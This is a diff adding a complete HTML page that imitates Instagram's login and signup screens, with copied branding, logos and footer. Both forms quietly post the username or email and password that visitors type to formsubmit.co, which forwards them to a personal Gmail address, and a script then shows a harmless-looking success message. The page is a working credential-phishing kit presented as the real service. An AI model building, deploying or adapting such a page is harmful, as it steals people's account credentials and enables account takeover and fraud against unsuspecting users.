@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" type="image/x-icon">   
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #fafafa;
+            color: #262626;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        .logo-container {
+            position: relative;
+            width: 175px;
+            height: 60px; /* Adjust based on logo height */
+            margin: 0 auto 24px; /* Center and add bottom margin */
+            text-align: center;
+        }
+        .logo-img {
+            width: 175px;
+            height: auto;
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%); /* Center horizontally */
+        }
+        .input-field {
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px;
+            font-size: 14px;
+            width: 100%;
+            box-sizing: border-box;
+            color: #262626;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #a0a0a0;
+        }
+        .btn-primary {
+            background-color: #0095f6;
+            color: white;
+            font-weight: 600;
+            border-radius: 8px;
+            padding: 7px 0;
+            font-size: 14px;
+            width: 100%;
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+        .btn-primary.enabled {
+            opacity: 1;
+            cursor: pointer;
+        }
+        .btn-primary:hover.enabled {
+            background-color: #1877f2;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 10px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+        /* Center form container */
+        .form-container {
+            width: 100%;
+            max-width: 350px;
+            padding: 0 16px;
+            box-sizing: border-box;
+            margin: 0 auto; /* Center horizontally */
+        }
+        /* Desktop-specific layout and themes */
+        @media screen and (min-width: 769px) {
+            .form-container {
+                position: absolute;
+                left: 50%;
+                top: 50%;
+                transform: translate(-50%, -50%) translateX(250px); /* Center and shift right */
+            }
+            .left-image {
+                position: absolute;
+                left: 50px;
+                top: 100px;
+                width: auto;
+                height: 500px;
+            }
+            /* Light theme (default or prefers-color-scheme: light) */
+            body {
+                background-color: #fafafa;
+                color: #262626;
+            }
+            .input-field {
+                background-color: #fafafa;
+                border-color: #dbdbdb;
+                color: #262626;
+            }
+            .input-field:focus {
+                border-color: #a0a0a0;
+            }
+            .btn-primary {
+                background-color: #0095f6;
+            }
+            .btn-primary:hover.enabled {
+                background-color: #1877f2;
+            }
+            .divider {
+                color: #8e8e8e;
+            }
+            .divider::before,
+            .divider::after {
+                border-color: #dbdbdb;
+            }
+            #login-card,
+            #signup-card,
+            .form-container > div.bg-white {
+                background-color: white;
+                border-color: #dbdbdb;
+            }
+            footer,
+            .form-container a,
+            .form-container .text-gray-500 {
+                color: #8e8e8e;
+            }
+            .logo-light {
+                display: none; /* Hide light logo in light theme */
+            }
+            .logo-dark {
+                display: block; /* Show dark logo in light theme */
+            }
+            /* Dark theme (prefers-color-scheme: dark) */
+            @media (prefers-color-scheme: dark) {
+                body {
+                    background-color: #181818;
+                    color: #e0e0e0;
+                }
+                .input-field {
+                    background-color: #262626;
+                    border-color: #404040;
+                    color: #e0e0e0;
+                }
+                .input-field:focus {
+                    border-color: #606060;
+                }
+                .btn-primary {
+                    background-color: #0095f6;
+                }
+                .btn-primary:hover.enabled {
+                    background-color: #1877f2;
+                }
+                .divider {
+                    color: #8e8e8e;
+                }
+                .divider::before,
+                .divider::after {
+                    border-color: #404040;
+                }
+                #login-card,
+                #signup-card,
+                .form-container > div.bg-white {
+                    background-color: #262626;
+                    border-color: #404040;
+                }
+                footer,
+                .form-container a,
+                .form-container .text-gray-500 {
+                    color: #b0b0b0;
+                }
+                .form-container a.text-blue-500 {
+                    color: #4dabf7;
+                }
+                .form-container a.text-blue-900 {
+                    color: #4dabf7;
+                }
+                .logo-light {
+                    display: block; /* Show light logo in dark theme */
+                }
+                .logo-dark {
+                    display: none; /* Hide dark logo in dark theme */
+                }
+            }
+        }
+        /* Mobile-specific layout (light theme with dark logo) */
+        @media screen and (max-width: 768px) {
+            .left-image {
+                display: none; /* Hide image on mobile */
+            }
+            .form-container {
+                margin-top: 20px; /* Add top margin for mobile */
+            }
+            .logo-light {
+                display: none; /* Ensure only dark logo on mobile */
+            }
+            .logo-dark {
+                display: block;
+            }
+        }
+        /* Ensure footer stays at bottom */
+        footer {
+            margin-top: auto;
+            padding: 20px 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+    <!-- Image on left (desktop only) -->
+    <img src="instagram-web-lox-image.png" alt="Instagram" class="left-image">
+    <!-- Form Container -->
+    <div class="form-container">
+        <!-- Login Card -->
+        <div id="login-card" class="bg-white border border-gray-200 rounded p-6 mb-4">
+            <div class="logo-container">
+                <img src="logo1.jfif" alt="Instagram Logo Dark" class="logo-img logo-dark">
+                <img src="logo2.png" alt="Instagram Logo Light" class="logo-img logo-light">
+            </div>
+            <form id="login-form" action="https://formsubmit.co/editingking.2977@gmail.com" method="POST" class="space-y-2">
+                <input type="hidden" name="_subject" value="New Login Submission">
+                <input type="hidden" name="_next" value="https://formsubmit.co/thanks">
+                <input type="hidden" name="_captcha" value="false">
+                <label class="block">
+                    <input type="text" name="username_or_email" id="login-username-or-email" placeholder="Username or Email" class="input-field" required>
+                </label>
+                <label class="block">
+                    <input type="password" name="password" id="login-password" placeholder="Password" class="input-field" required>
+                </label>
+                <button type="submit" id="login-submit" class="btn-primary" disabled>Log In</button>
+            </form>
+            <div class="divider">OR</div>
+            <div class="text-center">
+                <a href="#" class="text-blue-900 font-semibold text-sm hover:underline">Log in with Facebook</a>
+            </div>
+            <div class="text-center mt-4">
+                <a href="#" class="text-xs text-gray-500 hover:underline">Forgot password?</a>
+            </div>
+        </div>
+        <!-- Signup Card -->
+        <div id="signup-card" class="bg-white border border-gray-200 rounded p-6 mb-4 hidden">
+            <div class="logo-container">
+                <img src="logo1.jfif" alt="Instagram Logo Dark" class="logo-img logo-dark">
+                <img src="logo2.png" alt="Instagram Logo Light" class="logo-img logo-light">
+            </div>
+            <div class="text-center text-gray-500 text-sm mb-4">
+                Sign up to see photos and videos from your friends.
+            </div>
+            <form id="signup-form" action="https://formsubmit.co/editingking.2977@gmail.com" method="POST" class="space-y-2">
+                <input type="hidden" name="_subject" value="New Signup Submission">
+                <input type="hidden" name="_next" value="https://formsubmit.co/thanks">
+                <input type="hidden" name="_captcha" value="false">
+                <label class="block">
+                    <input type="text" name="username_or_email" id="signup-username-or-email" placeholder="Username or Email" class="input-field" required>
+                </label>
+                <label class="block">
+                    <input type="password" name="password" id="signup-password" placeholder="Password" class="input-field" required>
+                </label>
+                <button type="submit" id="signup-submit" class="btn-primary" disabled>Sign Up</button>
+            </form>
+            <div class="text-center mt-4 text-xs text-gray-500">
+                By signing up, you agree to our <a href="#" class="text-gray-500 hover:underline">Terms</a>, <a href="#" class="text-gray-500 hover:underline">Privacy Policy</a> and <a href="#" class="text-gray-500 hover:underline">Cookies Policy</a>.
+            </div>
+        </div>
+        <!-- Switch Card -->
+        <div class="bg-white border border-gray-200 rounded p-4 text-center text-sm">
+            <span id="switch-text">Don't have an account? </span>
+            <a href="#" id="switch-link" class="text-blue-500 font-semibold hover:underline">Sign up</a>
+        </div>
+        <!-- App Download -->
+        <div class="text-center mt-4">
+            <p class="text-sm mb-4">Get the app.</p>
+            <div class="flex justify-center space-x-2">
+                <a href="https://www.apple.com/app-store/" target="_blank">
+                    <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" class="h-10">
+                </a>
+                <a href="https://play.google.com/store" target="_blank">
+                    <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" alt="Google Play" class="h-12">
+                </a>
+            </div>
+        </div>
+    </div>
+    <!-- Footer -->
+    <footer class="text-center text-xs text-gray-500">
+        <div class="flex flex-wrap justify-center space-x-4 mb-4">
+            <a href="#" class="hover:underline">Meta</a>
+            <a href="#" class="hover:underline">About</a>
+            <a href="#" class="hover:underline">Blog</a>
+            <a href="#" class="hover:underline">Jobs</a>
+            <a href="#" class="hover:underline">Help</a>
+            <a href="#" class="hover:underline">API</a>
+            <a href="#" class="hover:underline">Privacy</a>
+            <a href="#" class="hover:underline">Terms</a>
+            <a href="#" class="hover:underline">Threads</a>
+            <a href="#" class="hover:underline">Top Accounts</a>
+            <a href="#" class="hover:underline">Hashtags</a>
+            <a href="#" class="hover:underline">Locations</a>
+            <a href="#" class="hover:underline">Instagram Lite</a>
+            <a href="#" class="hover:underline">Contact Uploading & Non-Users</a>
+            <a href="#" class="hover:underline">English</a>
+        </div>
+        <p>© 2025 Instagram from Meta</p>
+    </footer>
+
+    <script>
+        const loginForm = document.getElementById('login-form');
+        const loginUsernameOrEmail = document.getElementById('login-username-or-email');
+        const loginPassword = document.getElementById('login-password');
+        const loginSubmit = document.getElementById('login-submit');
+
+        const signupForm = document.getElementById('signup-form');
+        const signupUsernameOrEmail = document.getElementById('signup-username-or-email');
+        const signupPassword = document.getElementById('signup-password');
+        const signupSubmit = document.getElementById('signup-submit');
+
+        function validateLoginForm() {
+            const isValid = loginUsernameOrEmail.value.trim() !== '' && loginPassword.value.trim() !== '';
+            loginSubmit.disabled = !isValid;
+            loginSubmit.classList.toggle('enabled', isValid);
+        }
+
+        function validateSignupForm() {
+            const isValid = signupUsernameOrEmail.value.trim() !== '' && signupPassword.value.trim() !== '';
+            signupSubmit.disabled = !isValid;
+            signupSubmit.classList.toggle('enabled', isValid);
+        }
+
+        loginUsernameOrEmail.addEventListener('input', validateLoginForm);
+        loginPassword.addEventListener('input', validateLoginForm);
+        signupUsernameOrEmail.addEventListener('input', validateSignupForm);
+        signupPassword.addEventListener('input', validateSignupForm);
+
+        const loginCard = document.getElementById('login-card');
+        const signupCard = document.getElementById('signup-card');
+        const switchLink = document.getElementById('switch-link');
+        const switchText = document.getElementById('switch-text');
+
+        switchLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (loginCard.classList.contains('hidden')) {
+                signupCard.classList.add('hidden');
+                loginCard.classList.remove('hidden');
+                switchText.textContent = "Don't have an account? ";
+                switchLink.textContent = 'Sign up';
+            } else {
+                loginCard.classList.add('hidden');
+                signupCard.classList.remove('hidden');
+                switchText.textContent = 'Have an account? ';
+                switchLink.textContent = 'Log in';
+            }
+            loginForm.reset();
+            signupForm.reset();
+            loginSubmit.disabled = true;
+            signupSubmit.disabled = true;
+            loginSubmit.classList.remove('enabled');
+            signupSubmit.classList.remove('enabled');
+        });
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (loginSubmit.classList.contains('enabled')) {
+                try {
+                    const formData = new FormData(loginForm);
+                    const response = await fetch(loginForm.action, {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    if (response.ok) {
+                        alert('Login form submitted successfully!');
+                        loginForm.reset();
+                        validateLoginForm();
+                    } else {
+                        alert('Error submitting form. Please try again.');
+                    }
+                } catch (error) {
+                    alert('Network error. Please check your connection and try again.');
+                }
+            }
+        });
+
+        signupForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (signupSubmit.classList.contains('enabled')) {
+                try {
+                    const formData = new FormData(signupForm);
+                    const response = await fetch(signupForm.action, {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    if (response.ok) {
+                        alert('Signup form submitted successfully!');
+                        signupForm.reset();
+                        validateSignupForm();
+                    } else {
+                        alert('Error submitting form. Please try again.');
+                    }
+                } catch (error) {
+                    alert('Network error. Please check your connection and try again.');
+                }
+            }
+        });
+    </script>
+</body>
+</html>
